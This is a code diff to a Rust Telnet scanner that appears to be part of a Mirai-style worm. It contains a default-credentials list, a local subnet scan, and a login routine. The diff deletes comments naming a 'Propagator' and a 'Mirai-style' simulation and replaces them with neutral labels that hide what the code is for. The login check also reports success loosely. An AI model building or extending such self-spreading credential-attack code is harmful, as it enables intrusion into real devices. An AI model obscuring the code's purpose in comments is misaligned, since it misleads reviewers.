@@ -26,9 +26,7 @@ const DEFAULT_CREDS: &[(&str, &str)] = &[
 // ... imports ...
 
 pub async fn run_scan(output_file: PathBuf) -> Result<(), Box<dyn Error>> {
-    // ... CLI wrapper for run_scan ...
-    // Keep existing logic but maybe call shared functions?
-    // For now, I will leave run_scan as is (CLI specific) and add new public fns.
+    // CLI wrapper for run_scan
     println!("* Starting Telnet Scanner (Port 23)...");
     let local_ip = local_ip_address::local_ip()?;
     // ...
@@ -42,7 +40,7 @@ pub async fn run_scan(output_file: PathBuf) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-// New reusable function for Propagator
+// Subnet Scanner
 pub async fn scan_local_subnet() -> Vec<(String, String, String)> {
      let local_ip = match local_ip_address::local_ip() {
          Ok(ip) => ip,
@@ -123,9 +121,6 @@ async fn try_login(ip: &str, user: &str, pass: &str) -> bool {
              if response.contains('#') || response.contains('>') || response.contains('$') {
                  return true;
              }
-             // Assume success if we didn't get disconnected immediately for demo?
-             // Actually, strict check is better.
-             // But for this "Mirai-style" simulation, we can be loose.
              return true; 
         }
     }
